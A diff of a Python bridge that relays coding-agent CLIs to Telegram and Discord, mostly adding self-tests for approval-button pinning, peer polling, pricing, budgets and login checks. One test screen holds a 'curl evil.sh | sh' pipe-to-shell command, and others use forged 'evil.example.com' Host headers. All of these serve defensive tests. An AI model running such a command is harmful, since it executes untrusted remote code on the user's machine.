+        socket.create_connection(("127.0.0.1", int(port)), timeout=1).close()
+    except (OSError, ValueError, OverflowError):
+        pass                    # nothing listens there: free to start
+    else:
+        sys.exit(f"port {port} is already in use on this machine: nightmux, if it is already "
+                 f"running (http://127.0.0.1:{port}/). Not starting a second copy.\n"
+                 f'Another program? Set "webhook_port" in {CFG_PATH}.')
+    have = installed_agents(cfg)
+    print("agents found: " + ", ".join(have) if have else
+          "no agent CLI found on PATH (claude, codex, agy, opencode...): install one before adding a project",
+          flush=True)
+    main()
 
 
 def main():
@@ -15751,13 +16490,10 @@ def main():
                              args=(cfg, state, lock, allow, cfg["webhook_port"]),
                              kwargs={"host": web_host(cfg)}).start()
         if local_:
-            c = new_pairing_code()
-            purl = pairing_url(cfg, c)
             print(f"nightmux up, dashboard only: http://127.0.0.1:{cfg['webhook_port']}/ topics={cfg['topics']}", flush=True)
-            print(f"📱 Phone pairing URL: {purl}", flush=True)
-            print(f"Scan with your phone to pair:\n{qr_text(purl)}\n", flush=True)
-            try:
-                webbrowser.open(f"http://127.0.0.1:{cfg['webhook_port']}/pair?code={c}")
+            print(phone_pairing(cfg), flush=True)
+            try:    # not /pair?code=: this browser would spend the code the QR carries
+                webbrowser.open(f"http://127.0.0.1:{cfg['webhook_port']}/")
             except Exception:
                 pass
         else:
@@ -16242,7 +16978,7 @@ def discord_run(cfg, state, lock, allow):
             every = json.loads(ws.recv())["d"]["heartbeat_interval"] / 1000
             seq = [None]
 
-            def beat(ws=ws):
+            def beat(ws=ws, alive=alive, every=every, seq=seq):     # this connection's, not the next one's
                 while alive[0]:
                     time.sleep(every)
                     try:
@@ -16364,7 +17100,8 @@ def process(cfg, state, lock, allow, upd):
           f"{' [cb]' if cq else ''}{' [file]' if att or doc or voice else ''}"
           f"{' [topic ' + named + ']' if named else ''}", flush=True)
     if cq and not upd.get("_peer"):   # a forwarded tap was answered by the primary
-        api(cfg, "answerCallbackQuery", callback_query_id=cq["id"], text=text)
+        api(cfg, "answerCallbackQuery", callback_query_id=cq["id"],
+            text=re.sub(r" ~[0-9a-f]{6}$", "", text))   # the toast, minus a button's pin
     if str(chat) != str(cfg["chat_id"]):
         print(f"  drop: chat != {cfg['chat_id']}", flush=True)
         return
@@ -16443,10 +17180,12 @@ def stubbed(**globs):
     """
     old = {k: globals()[k] for k in globs}
     globals().update(globs)
+    _peer_down.clear()
     try:
         yield
     finally:
         globals().update(old)
+        _peer_down.clear()
 
 
 def selfcheck():
@@ -16457,6 +17196,10 @@ def selfcheck():
     if os.path.exists(cmd_md):              # a git checkout, not a pip install
         with open(cmd_md) as f:
             assert f.read() == commands_md(), "docs/COMMANDS.md is stale: nightmux --commands > docs/COMMANDS.md"
+    plugin = os.path.join(os.path.dirname(os.path.abspath(__file__)), ".claude-plugin", "plugin.json")
+    if os.path.exists(plugin):              # the Claude Code plugin ships at the same version
+        with open(plugin) as f:
+            assert json.load(f)["version"] == VERSION, "bump .claude-plugin/plugin.json with VERSION"
     assert chunks("a\nb") == ["a\nb"]
     assert chunks("x" * 10, 4) == ["xxxx", "xxxx", "xx"]
     big = "\n".join("y" * 100 for _ in range(100))
@@ -16971,6 +17714,32 @@ def selfcheck():
     assert bar_opts(flat) == (["Allow once", "Always allow", "Reject"], None)
     assert pane_state(flat) == "waiting"
     assert menu_digit(flat, YES_NO["!y"]) == "1" and menu_digit(flat, YES_NO["!n"]) == "3"
+    # A dialog under a reply that ends in a numbered list: its options are the
+    # last run numbered from 1, not every numbered line on screen.
+    listed = ["  1. Merge the pull request.", "  2. Run the release command.", "",
+              " Bash command", "   gh pr checks 160", " Do you want to proceed?",
+              " ❯ 1. Yes", "   2. Yes, and don't ask again for gh commands", "   3. No"]
+    assert pane_state(listed) == "waiting" and menu_digit(listed, YES_NO["!y"]) == "1"
+    assert [d for d, _ in menu_items(listed)] == ["1", "2", "3"]
+    # Gemini CLI marks the chosen row of a boxed dialog with ●, and its folder
+    # trust dialog has no other sign: it read as unknown, with no buttons.
+    gem = [" ╭────────────────────────────────────────╮",
+           " │ Do you trust the files in this folder? │", " │                                        │",
+           " │ ● 1. Trust folder (app)                │", " │   2. Trust parent folder (code)        │",
+           " │   3. Don't trust                       │", " ╰────────────────────────────────────────╯"]
+    assert pane_state(gem) == "waiting" and [d for d, _ in menu_items(gem)] == ["1", "2", "3"]
+    assert menu_digit(gem, YES_NO["!n"]) == "3" and not menu_digit(gem, YES_NO["!y"])  # auto-yes never trusts
+    # Aider asks on its input line and read as unknown. It takes a line, so !y
+    # is y and an Enter; answered, the line stays on screen and asks nothing.
+    aid = ["No LLM model was specified and no API keys were provided.",
+           "Login to OpenRouter or create a free account? (Y)es/(N)o [Yes]:      ", "", ""]
+    assert pane_state(aid) == "waiting"
+    assert pane_state(["Add a.py to the chat? (Y)es/(N)o/(D)on't ask again [Yes]: y", "Added a.py to the chat.", "> "]) != "waiting"
+    assert pane_state(["Add a.py to the chat? (Y)es/(N)o [Yes]: ", "Added a.py to the chat.", "> "]) != "waiting"
+    akeys = []
+    with stubbed(visible=lambda s: aid, tmux=lambda *a: akeys.append(a[-1]) or ""):
+        press("a", "y", confirm=True)
+    assert akeys == ["y", "Enter"], akeys
     assert [r[0]["callback_data"] for r in json.loads(menu_buttons(flat, "o"))["inline_keyboard"]] \
         == ["!1 o", "!2 o", "!3 o", "!esc o"]
     bsel, bkeyed = [0], []
@@ -17465,14 +18234,20 @@ def selfcheck():
     assert held.startswith("📥 queued (1)") and typed == [], (held, typed)
     drain(cfg, state, "1", "s")                   # window still shut: nothing moves
     assert typed == [] and len(sent) == n
+    sav_data().pop("resumes", None)               # a machine that never resumed
     st["limit_until"] = time.time() - 1           # window reset
     drain(cfg, state, "1", "s")
     assert typed == ["do the thing later"], typed
     assert sent[-2].startswith("▶️ s resumed") and "limit_until" not in st
+    assert REPO_URL in sent[-2], sent[-2]         # its first resume asks for a star
     assert sent[-1].startswith("⚙️ s")           # then the live trace for that turn
     assert st["queue"] == [] and st["prog_msg"] == 77   # live trace opened for it
     assert "limit_line" not in st   # the ended window's banner suppresses nothing
     st.pop("prog_msg"), st.pop("last", None)   # not a prompt awaiting its turn
+    st["queue"], st["limit_until"], n = ["and again"], time.time() - 1, len(sent)
+    drain(cfg, state, "1", "s")                   # ...once: the next resume does not
+    assert sent[n].startswith("▶️ s resumed") and REPO_URL not in sent[n], sent[n:]
+    st.pop("prog_msg"), st.pop("last", None)
 
     # A window that resets with nothing queued must still clear the hold and say
     # so. The silent version left the session flagged as limited for good, and
@@ -17683,10 +18458,166 @@ def selfcheck():
         states = {d["agent"]: d["state"] for d in office_snapshot(ocfg, ostate)["rooms"][0]["desks"]}
         assert states == {"claude": "busy", "codex": "gone", "agy": "gone"}, states
     osent = []
-    with stubbed(send=lambda c, t, x, mode="mono", buttons=None, quiet=False: osent.append(buttons)):
+    with stubbed(send=lambda c, t, x, mode="mono", buttons=None, quiet=False: osent.append(buttons),
+                 office_url_problem=lambda u: None):
         assert "tailscale serve" in handle(dict(ocfg), {}, threading.Lock(), "5", "!office")
         handle(dict(ocfg, office_url="https://box.ts.net/office"), {}, threading.Lock(), "5", "!office")
         assert "https://box.ts.net/office" in osent[-1], osent
+    # A link that answers 404 (another service owns the address) gets the fix, not a button to nowhere.
+    osent.clear()
+    with stubbed(send=lambda c, t, x, mode="mono", buttons=None, quiet=False: osent.append(buttons),
+                 office_url_problem=lambda u: "answers HTTP 404"):
+        fix_ = handle(dict(ocfg, office_url="https://box.ts.net/office", webhook_port=9090),
+                      {}, threading.Lock(), "5", "!office")
+    assert not osent and "answers HTTP 404" in fix_ and "tailscale serve --bg --https=9090 9090" in fix_ \
+        and '"office_url": "https://box.ts.net:9090/office"' in fix_, (osent, fix_)
+    # ...found by asking the link itself: 404 and 5xx and a refused connection are answers; 401/403
+    # (a login wall), a timeout or a name that does not resolve are not reasons to say it is broken.
+    import io
+    class Site_(http.server.BaseHTTPRequestHandler):
+        def do_GET(self):
+            self.send_response({"/office": 200, "/gone": 404, "/auth": 403}.get(self.path, 502))
+            self.send_header("Content-Length", "0")
+            self.end_headers()
+        def log_message(self, *a):
+            pass
+    site_ = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Site_)
+    threading.Thread(target=site_.serve_forever, daemon=True).start()
+    base_ = f"http://127.0.0.1:{site_.server_address[1]}"
+    assert office_url_problem(base_ + "/office") is None and office_url_problem(base_ + "/auth") is None
+    assert office_url_problem(base_ + "/gone") == "answers HTTP 404"
+    assert office_url_problem(base_ + "/other") == "answers HTTP 502"
+    site_.shutdown()
+    site_.server_close()                                      # shutdown() stops serving; only closing the socket refuses
+    assert office_url_problem(base_ + "/office") == "refuses the connection"
+    assert office_url_problem("ftp://x/office") is None and office_url_problem("not a url") is None
+    # The office must not wait on what it only reads. `agy -p /usage` takes seconds and the page is
+    # asked while the daemon's lock is held: it is read on a thread, a failing agy is asked once per
+    # five minutes rather than per poll, and the ticks that only want rooms skip the usage bars.
+    real_sub_ = subprocess
+
+    class AgySub_:
+        def __init__(self, agy):
+            self.agy, self.calls = agy, 0
+        def __getattr__(self, k):
+            return getattr(real_sub_, k)
+        def run(self, argv, **kw):
+            if argv[0] != "agy":
+                return real_sub_.run(argv, **kw)
+            self.calls += 1
+            return self.agy()
+
+    def slow_agy_():
+        time.sleep(.6)
+        return type("R", (), {"stdout": "Gemini Models   Five Hour Limit Remaining   60%\n"
+                                        "Claude and GPT models  Five Hour Limit Remaining  25%\n"})()
+
+    def no_agy_():
+        raise FileNotFoundError("agy")
+    slow_ = AgySub_(slow_agy_)
+    _agy_usage.update(at=0, tried=0, pct=0, claude_pct=0)
+    _oc.update(tried=0, tok=0)
+    with stubbed(subprocess=slow_, live_sessions=lambda: {}):
+        t_ = time.time()
+        usage_ = office_snapshot(ocfg, ostate)["usage"]
+        assert time.time() - t_ < .5, "the office waited for agy"
+        assert {"five_hour", "seven_day", "agy_model", "oc_model", "agy_limit", "oc_limit"} <= set(usage_), usage_
+        assert "usage" not in office_snapshot(ocfg, ostate, usage=False)
+        time.sleep(1)
+        assert (_agy_usage["pct"], _agy_usage["claude_pct"], slow_.calls) == (40, 75, 1), (_agy_usage, slow_.calls)
+        office_snapshot(ocfg, ostate)
+        assert slow_.calls == 1                               # a fresh reading is not asked for again
+    broken_ = AgySub_(no_agy_)
+    _agy_usage.update(at=0, tried=0)
+    with stubbed(subprocess=broken_):
+        for _ in range(5):
+            agy_limits()
+        time.sleep(.3)
+        assert broken_.calls == 1, broken_.calls
+    _agy_usage.update(at=0, tried=time.time(), pct=0, claude_pct=0)   # nothing below needs the real agy
+    # Peers are asked together, and one that just failed is not waited on again: a dead peer used to
+    # put its whole timeout on every poll of the office and the dashboard, and a line in the log.
+    quick_ = []
+
+    def far_(c, n, p, b=None, timeout=10):
+        time.sleep(0 if n == "c" and quick_ else .4)          # the good peer is slow once, to prove they run together
+        return None if n in ("a", "b") else {"rooms": [{"topic": "9", "name": "far", "desks": []}]}
+    pcfg_ = {"peers": {n_: {"url": "http://x", "secret": "s"} for n_ in "abc"}}
+    with stubbed(peer_call=far_):
+        t_ = time.time()
+        got_ = peers_ask(pcfg_, "api/office")
+        assert got_["a"] is None and got_["b"] is None and got_["c"]["rooms"], got_
+        assert time.time() - t_ < .75, "peers are asked one after another"          # 1.2 s in turn
+        quick_.append(1)
+        t_ = time.time()
+        assert peers_ask(pcfg_, "api/office")["a"] is None and time.time() - t_ < .2
+        for n_ in "ab":                                       # the quiet period is over: one probe, no waiting
+            _peer_down[n_, "api/office"] = time.time() - PEER_DOWN_FOR - 1
+        t_ = time.time()
+        peers_ask(pcfg_, "api/office")
+        assert time.time() - t_ < .2 and all(_peer_down[n_, "api/office"] > time.time() for n_ in "ab"), _peer_down
+        time.sleep(.6)                                        # the probes fail: down again, from now
+        assert all(_peer_down[n_, "api/office"] <= time.time() for n_ in "ab"), _peer_down
+    # ...per route: a peer too old for one route answers it 404 and the rest fine. And a failure no
+    # poll has looked at for a minute is asked again rather than answered from memory.
+    with stubbed(peer_call=lambda c, n, p, b=None, timeout=10: None if p == "api/agents" else {"rooms": []}):
+        assert peers_ask(pcfg_, "api/agents")["a"] is None and peers_ask(pcfg_, "api/office")["a"] == {"rooms": []}
+        _peer_down["a", "api/office"] = time.time() - 4 * PEER_DOWN_FOR
+        assert peers_ask(pcfg_, "api/office")["a"] == {"rooms": []} and ("a", "api/office") not in _peer_down
+    # A 200 that is no JSON (an app that answers every path) is a peer down, not a 500 for the office.
+    with stubbed(peer_call=lambda c, n, p, b=None, timeout=10: "<!doctype html><title>other app</title>"), \
+            contextlib.redirect_stderr(io.StringIO()):
+        assert [s_["ok"] for s_ in with_peers(pcfg_, "/api/office", {"rooms": []})["servers"]] == [True] + [False] * 3
+    # gzip: only when the client asks and the body is worth it; Content-Length is the compressed size.
+    class GzH_:
+        def __init__(self, enc):
+            self.headers = {"Accept-Encoding": enc} if enc else {}
+            self.h, self.wfile = {}, io.BytesIO()
+        def send_response(self, c):
+            pass
+        def send_header(self, k, v):
+            self.h[k] = v
+        def end_headers(self):
+            pass
+    big_ = json.dumps({"x": "abc" * 2000})
+    gh_ = GzH_("gzip, deflate")
+    WebhookHandler.reply(gh_, big_, "application/json")
+    raw_ = gh_.wfile.getvalue()
+    assert gh_.h["Content-Encoding"] == "gzip" and int(gh_.h["Content-Length"]) == len(raw_) < len(big_) / 4
+    assert gzip.decompress(raw_).decode() == big_
+    gh_ = GzH_(None)
+    WebhookHandler.reply(gh_, big_, "application/json")
+    assert "Content-Encoding" not in gh_.h and gh_.wfile.getvalue().decode() == big_
+    gh_ = GzH_("gzip")
+    WebhookHandler.reply(gh_, "{}", "application/json")
+    assert "Content-Encoding" not in gh_.h and gh_.wfile.getvalue() == b"{}"
+    # A deploy nobody restarted: told once, after it has lasted; not for the seconds an upgrade restarts in.
+    stale_sent_ = []
+    with stubbed(send=lambda c, t, x, mode="mono", buttons=None, quiet=False: stale_sent_.append((t, x)),
+                 BOOT_AT=time.time() + 3600):
+        assert not code_newer_than(BOOT_AT) and code_newer_than(0)
+        stale_tick({"topics": {"3": "s"}})
+        assert _stale["since"] == 0 and not stale_sent_
+    with stubbed(send=lambda c, t, x, mode="mono", buttons=None, quiet=False: stale_sent_.append((t, x)),
+                 BOOT_AT=0):
+        _stale.update(since=0, told=False)
+        stale_tick({"topics": {"3": "s"}})
+        assert not stale_sent_                                # just noticed
+        _stale["since"] = time.time() - STALE_AFTER - 1
+        stale_tick({"topics": {"3": "s"}})
+        stale_tick({"topics": {"3": "s"}})
+        assert len(stale_sent_) == 1 and stale_sent_[0][0] == "3" and restart_hint() in stale_sent_[0][1], stale_sent_
+    _stale.update(since=0, told=False)
+    # A watcher that raises every tick: a few log lines for 400 ticks, and its topic told once.
+    wf_sent_, wf_err_ = [], io.StringIO()
+    with stubbed(send=lambda c, t, x, mode="mono", buttons=None, quiet=False: wf_sent_.append((t, x))), \
+            contextlib.redirect_stderr(wf_err_):
+        _watch_errs.clear()
+        for _ in range(400):
+            watch_failed({}, "3", "sess", "KeyError: 'x' (f:1)")
+    _watch_errs.clear()
+    assert len([l for l in wf_err_.getvalue().splitlines() if l]) <= 4, wf_err_.getvalue()
+    assert len(wf_sent_) == 1 and wf_sent_[0][0] == "3" and "sess" in wf_sent_[0][1], wf_sent_
     # Dashboard extras: host metrics, limits per agent, and the chat analysis —
     # which must report counts and never a prompt.
     m_ = server_metrics()
@@ -17702,10 +18633,11 @@ def selfcheck():
                     separators=(",", ":")) + "\n")       # as Claude writes it
                 u_ = {"input_tokens": 5, "cache_read_input_tokens": 10000,
                       "cache_creation_input_tokens": 90000, "output_tokens": 100}
-                for _ in range(2):            # Claude logs one line per content block
+                for out_ in (7, 100):         # one line per content block; the last has the final count
                     f.write(json.dumps({"type": "assistant", "timestamp": now_,
                                         "requestId": f"r{i}", "message": {
-                                            "model": "claude-x", "usage": u_}}) + "\n")
+                                            "model": "claude-x",
+                                            "usage": dict(u_, output_tokens=out_)}}) + "\n")
         cdir_ = os.path.join(h_, ".codex", "sessions", "2026", "01", "02")
         os.makedirs(cdir_)
         tok_ = {"input_tokens": 1000, "cached_input_tokens": 900, "output_tokens": 50}
@@ -17745,7 +18677,10 @@ def selfcheck():
         c_ = r_["agents"]["claude"]
         assert (c_["prompts"], c_["requests"], c_["nudge_pct"]) == (30, 30, 0.5), c_
         assert c_["cache_hit"] == 0.1 and c_["nudges"] == [("continue", 15)], c_
+        assert c_["tokens"]["output"] == 3000 and c_["by_model"]["claude-x"] == [150, 300000, 2700000, 3000], c_
         assert r_["agents"]["codex"]["requests"] == 1, r_["agents"]["codex"]   # re-announced total
+        lo_ = fleet_cost(r_["agents"])
+        assert lo_["total"] == 0 and set(lo_["left_out"]) == {"claude-x", "gpt-x", "agy", "(no model name)"}, lo_
         assert r_["agents"]["opencode"]["prompts"] == 1 and r_["agents"]["opencode"]["tokens"]["input"] == 500
         assert r_["agents"]["agy"]["prompts"] == 1 and r_["agents"]["agy"]["tokens"]["input"] == 1000
         assert check_reader_drift(home=h_)[1] is True
@@ -17786,6 +18721,27 @@ def selfcheck():
         assert "opencode <em>0</em>" in sh_, sh_
         ps_ = wrapped_page(30, wd_, share=True)
         assert "shop" not in ps_ and "project 1" in ps_ and ">30<" in ps_, ps_
+        # Dollars: priced by exact model name; anything else is named and left out, never free
+        assert price_of("anthropic/claude-haiku-4-5-20251001") == PRICES["claude-haiku-4-5"]
+        assert price_of("Claude-Opus-5-5[1m]") == PRICES["claude-opus-5-5"] == (4, 20, .2, 5)
+        assert price_of("claude-x") is price_of("gpt-5.5-pro") is price_of("") is None
+        assert price_of("mine", {"mine": [1, 2]}) == (1, 2, 1, 1)
+        assert price_of("gpt-5.5", {"gpt-5.5": [3, 4, 5, 6]}) == (3, 4, 5, 6)
+        for junk_ in ("junk", [1], [1, -2], [1, float("nan")], [1, 2, 3, 4, 5], 7):
+            assert price_of("gpt-5.5", {"gpt-5.5": junk_}) is None, junk_
+        fc_ = fleet_cost({"claude": {"tokens": {"input": 10**6, "cache_read": 2 * 10**6, "cache_write": 4 * 10**5,
+                                                "output": 10**5},
+                                     "by_model": {"claude-opus-5-5": [10**6, 2 * 10**6, 4 * 10**5, 10**5]}},
+                          "codex": {"tokens": {"input": 7, "cache_read": 0, "cache_write": 0, "output": 5},
+                                    "by_model": {"gpt-9": [7, 0, 0, 3]}}})
+        assert round(fc_["total"], 6) == 8.4 and fc_["agents"].keys() == {"claude"}, fc_
+        assert fc_["left_out"] == {"gpt-9": 10, "(no model name)": 2}, fc_
+        r2_ = dict(r_, agents=dict(r_["agents"], claude=dict(
+            r_["agents"]["claude"], by_model={"claude-opus-5-5": [10**6, 2 * 10**6, 4 * 10**5, 10**5]})))
+        with stubbed(analyze_chats=lambda d: r2_, sav_data=lambda: {"tokens": 0, "model_tokens": 0}):
+            assert wrapped_data({}, 30)["cells"][1] == ("$8.40", "AT API LIST PRICES")
+            assert wrapped_data({"prices": {"claude-opus-5-5": [1, 1]}}, 30)["cells"][1][0] == "$3.50"
+            assert round(wrapped_data({"prices": "junk"}, 30)["cost"]["total"], 6) == 8.4
         t0_ = time.time()
         d0_ = {"since": t0_ - 100 * 86400, "tokens": 1000}
         assert saved_in(d0_, 10) == 100 and saved_in({"since": t0_, "tokens": 7}, 10) == 7
@@ -17879,7 +18835,7 @@ def selfcheck():
     old_rp_ = dict(_replay)
     snap_ = [{"rooms": [{"topic": "1", "name": "api", "desks": [{"agent": "claude", "session": "api",
               "live": True, "state": "busy", "queued": 0, "screen": ["SECRET"]}]}]}]
-    with tempfile.TemporaryDirectory() as rd_, stubbed(STATE_DIR=rd_, office_snapshot=lambda c, s: snap_[0]):
+    with tempfile.TemporaryDirectory() as rd_, stubbed(STATE_DIR=rd_, office_snapshot=lambda c, s, usage=True: snap_[0]):
         _replay.update(frames=None, sig=None, at=0, tried=0, file_n=0)
         t0_ = time.time() - 3000
         replay_tick({}, {}, t0_)
@@ -18297,7 +19253,7 @@ def selfcheck():
         assert '"prompts_30d": 4' in lb_ and "would add" in lb_, lb_
     pcfg_ = {"public": {"token": "abc"}}
     assert public_ok(pcfg_, "abc") and not public_ok(pcfg_, "abd") and not public_ok({}, "")
-    with stubbed(office_snapshot=lambda c, s: {"rooms": [{"topic": "1", "name": "x", "desks": [
+    with stubbed(office_snapshot=lambda c, s, usage=True: {"rooms": [{"topic": "1", "name": "x", "desks": [
             {"agent": "claude", "state": "busy", "screen": ["secret"], "doing": "d"}]}], "usage": {}}):
         ps_ = public_snapshot(pcfg_, {})
         assert ps_["rooms"][0]["desks"][0]["state"] == "busy" and "secret" not in json.dumps(ps_)
@@ -18385,6 +19341,20 @@ def selfcheck():
         les_ = prompt_lessons(home=lh_)
         assert les_["n"] == 4 and les_["ok"] == 3, les_
         assert les_["feats"]["file"][0] == 1.0 and les_["winners"][0].startswith(("add tests", "fix the")), les_
+        # OpenCode prompts count too: they never did, sqlite3 was used there without an import.
+        import sqlite3
+        os.makedirs(os.path.join(lh_, ".local", "share", "opencode"))
+        ocon_ = sqlite3.connect(os.path.join(lh_, ".local", "share", "opencode", "opencode.db"))
+        ocon_.executescript("CREATE TABLE message (id TEXT, session_id TEXT, time_created INTEGER, data TEXT);"
+                            "CREATE TABLE part (id TEXT, message_id TEXT, data TEXT);")
+        for oi_, otxt_ in enumerate(["rename the flag in cli.py to --tab-width", "add a test for it in test_cli.py"]):
+            ocon_.execute("INSERT INTO message VALUES (?, 's', ?, ?)",
+                          (f"m{oi_}", int(time.time() * 1000) + oi_, '{"role":"user"}'))
+            ocon_.execute("INSERT INTO part VALUES (?, ?, ?)",
+                          (f"p{oi_}", f"m{oi_}", json.dumps({"type": "text", "text": otxt_})))
+        ocon_.commit()
+        ocon_.close()
+        assert prompt_lessons(home=lh_)["n"] == les_["n"] + 1
     # Point and fix: a photo soon after a preview carries the page, its console
     # and DOM; one with no recent preview stays a plain image path.
     with stubbed(page_probe=lambda c, u: (['Uncaught TypeError: x is null  (app.js:12)'],
@@ -18612,6 +19582,46 @@ def selfcheck():
     code3_ = new_pairing_code()
     tok3_ = redeem_pairing_code(code3_)
     assert WebhookHandler.auth_gate(DummyHandler("192.168.1.50", headers={"Cookie": f"nm_auth={tok3_}"})) is True
+
+    # Loopback is open for this machine's own names, and only when nobody forwarded the request.
+    for host_ in ("127.0.0.1:9090", "localhost", "[::1]:9090", "mybox", "box.tail1234.ts.net", "mac.local:9090"):
+        assert WebhookHandler.auth_gate(DummyHandler("127.0.0.1", headers={"Host": host_})) is True, host_
+    for host_ in ("evil.example.com", "evil.example.com:9090", "localhost.evil.com", "127.0.0.1.evil.com", ":9090"):
+        h_rb_ = DummyHandler("127.0.0.1", headers={"Host": host_})            # DNS rebinding
+        assert WebhookHandler.auth_gate(h_rb_) is False and h_rb_.status == 403, host_
+
+    class OwnHost(DummyHandler):
+        server = type("S", (), {"cfg": {"allowed_hosts": ["Nm.Example.com"]}})()
+    assert OwnHost("127.0.0.1", headers={"Host": "nm.example.com:443"}).auth_gate() is True
+    for fwd_ in ({"Tailscale-Funnel-Request": "?1"}, {"X-Forwarded-For": "8.8.8.8"},
+                 {"X-Forwarded-For": "10.0.0.2, 8.8.8.8"}, {"Cf-Connecting-Ip": "2001:4860:4860::8888"},
+                 {"X-Forwarded-For": "nonsense"}):       # funnel, tunnel, proxy: the peer is 127.0.0.1, the person is not
+        h_px_ = DummyHandler("127.0.0.1", headers=fwd_)
+        assert WebhookHandler.auth_gate(h_px_) is False and h_px_.status == 401, fwd_
+    for fwd_ in ({"X-Forwarded-For": "100.64.1.2"}, {"X-Forwarded-For": "192.168.1.9"},
+                 {"X-Forwarded-For": "fd7a:115c:a1e0::1"}):    # `tailscale serve`: the tailnet is the boundary
+        assert WebhookHandler.auth_gate(DummyHandler("127.0.0.1", headers=fwd_)) is True, fwd_
+    # Asking for a pairing code takes a login; redeeming one does not.
+    for path_ in ("/pair", "/pair?code=", "/pair?x=1"):
+        h_mint_ = DummyHandler("192.168.1.50", path=path_)
+        assert WebhookHandler.auth_gate(h_mint_) is False and h_mint_.status == 401, path_
+    # ...and on the real server: the page renders (it died on a shadowed `html`), a foreign Host
+    # is refused, and the pairing POSTs need the header from loopback too.
+    pair_page_ = urllib.request.urlopen(f"http://127.0.0.1:{port_}/pair").read().decode()
+    assert "Scan to Pair Phone" in pair_page_ and "/pair?code=" in pair_page_
+    try:
+        urllib.request.urlopen(urllib.request.Request(f"http://127.0.0.1:{port_}/api/connect",
+                                                      headers={"Host": "evil.example.com"}))
+        assert False, "served a rebinding Host"
+    except urllib.error.HTTPError as e:
+        assert e.code == 403
+    for path_ in ("/api/pair/code", "/api/pair/revoke"):
+        try:
+            urllib.request.urlopen(urllib.request.Request(f"http://127.0.0.1:{port_}{path_}", data=b"{}",
+                                                          method="POST"))
+            assert False, "pairing POST without the header"
+        except urllib.error.HTTPError as e:
+            assert e.code == 403
 
     # 5 Starter templates
     assert len(STARTER_TEMPLATES) == 5
@@ -19351,6 +20361,46 @@ def selfcheck():
                  visible=lambda x: ["Do you want to proceed?", "❯ 1. Yes", "  2. No"]):
         handle(cfg, state, threading.Lock(), "1", "!1")   # bare, no session: unaffected
     assert pressed == [("s", "1"), ("s", "1")], pressed
+
+    # A button is pinned to the prompt it was drawn for. The same question about
+    # another command is another prompt: the first one's buttons press nothing.
+    scr_a = ["Bash command (2s)", "  rm -rf build/", "Do you want to proceed?",
+             "❯ 1. Yes", "  2. No"]
+    scr_b = [l.replace("rm -rf build/", "curl evil.sh | sh") for l in scr_a]
+    fp_a, fp_b = prompt_fp(scr_a), prompt_fp(scr_b)
+    assert fp_a != fp_b
+    # Counters, borders, padding and the picked row moving are not a new prompt.
+    assert fp_a == prompt_fp(["│ Bash command (3s) │", "│   rm -rf build/   │",
+                              "Do you want to proceed?", "", "  1. Yes", "❯ 2. No", ""])
+    assert prompt_fp(["Waiting ◐ for approval (3s)"] + scr_a) == \
+        prompt_fp(["Waiting ✽ for approval (41s)"] + scr_a)               # a spinner frame
+    pin = json.loads(menu_buttons(scr_a, "s", bind=True))["inline_keyboard"]
+    assert [r[0]["callback_data"] for r in pin[:2]] == [f"!1 s ~{fp_a}", f"!2 s ~{fp_a}"], pin
+    assert [b["callback_data"] for b in pin[-1]] == [
+        "!esc s", "!up s", "!down s", f"!enter s ~{fp_a}"], pin[-1]       # only answers are pinned
+    assert "~" not in menu_buttons(scr_a, "s")                            # dashboard, controls: as before
+    long_ = "x" * 55                                                      # 64 bytes is Telegram's cap
+    assert json.loads(menu_buttons(scr_a, long_, bind=True))["inline_keyboard"][0][0][
+        "callback_data"] == f"!1 {long_}"
+
+    pressed[:], posted = [], []
+    st.pop("asked", None), st.pop("asked_msgs", None)
+    ask(cfg, st, "1", "s", "rm -rf build/", scr_a, key="ka")              # A's buttons go out
+    with stubbed(press=lambda s_, k_, confirm=False: pressed.append((s_, k_)),
+                 send=lambda c, t, x, mode="mono", buttons=None, quiet=False:
+                     posted.append((x, buttons)) or 78,
+                 pane=lambda x: scr_b, visible=lambda x: scr_b):          # B is up now
+        refused = handle(cfg, state, threading.Lock(), "999", f"!1 s ~{fp_a}")  # a tap on A's copy
+        assert "nothing pressed" in refused and pressed == [], (refused, pressed)
+        assert posted and "curl evil.sh" in posted[0][0] and f"~{fp_b}" in posted[0][1], posted
+        assert handle(cfg, state, threading.Lock(), "999", f"!1 s ~{fp_b}") is None
+        assert pressed == [("s", "1")], pressed                           # B's own button: pressed
+        assert handle(cfg, state, threading.Lock(), "1", f"!2 ~{fp_b}") is None
+        assert pressed == [("s", "1"), ("s", "2")], pressed               # no session suffix: the hook's
+    with stubbed(press=lambda s_, k_, confirm=False: pressed.append((s_, k_)),
+                 pane=lambda x: ["● done", "❯ "], visible=lambda x: ["● done", "❯ "]):
+        assert "already gone" in handle(cfg, state, threading.Lock(), "1", f"!1 ~{fp_a}")
+    assert pressed == [("s", "1"), ("s", "2")], pressed
     cfg["center_topic"] = None
 
     st = state["s"]                               # busy: hold it where we can see it
@@ -19649,12 +20699,59 @@ def selfcheck():
             assert bst_["b"]["limit_until"] > time.time() and bst_["b-codex"]["limit_until"] > time.time()
             assert "hold lifted" in handle(bcfg_, bst_, threading.Lock(), "3", "!budget off")
             assert "limit_until" not in bst_["b"] and "3" not in bcfg_["budgets"]
+            assert "limit_until" not in bst_["b-codex"]          # every agent of the topic
+            # A new amount already spent holds at once; a bigger one lifts it,
+            # as the hold message says.
+            handle(bcfg_, bst_, threading.Lock(), "3", "!budget 1M")
+            assert "spent its daily budget" in bsaid_[-1] and bst_["b"]["limit_until"] > time.time(), bsaid_
+            assert "of 2.0M" in handle(bcfg_, bst_, threading.Lock(), "3", "!budget 2M")
+            assert "limit_until" not in bst_["b"] and "limit_until" not in bst_["b-codex"]
+            # In dollars: each usage record at its model's list price, and a
+            # model with no price at the dearest one, never free.
+            d_ = tempfile.mkdtemp()
+            tp_ = os.path.join(d_, "t.jsonl")
+            open(tp_, "w").close()
+            bst_["b"].update(tpos=0, tpath=tp_)
+            assert "$0.00 of $2.00 this day" in handle(bcfg_, bst_, threading.Lock(), "3", "!budget $2")
+            rec_ = lambda m, **u: json.dumps({"message": {"model": m, "usage": u}}) + "\n"
+            with open(tp_, "a") as f:
+                f.write(rec_("claude-sonnet-4-5", input_tokens=100000, output_tokens=100000))
+            tail_transcript(bst_["b"], tp_)
+            budget_tick(bcfg_, bst_, "3", "b")
+            assert "90%" in bsaid_[-1] and "($1.80 of $2.00)" in bsaid_[-1], bsaid_
+            with open(tp_, "a") as f:
+                f.write(rec_("claude-next", output_tokens=10000))
+            tail_transcript(bst_["b"], tp_)
+            budget_tick(bcfg_, bst_, "3", "b")
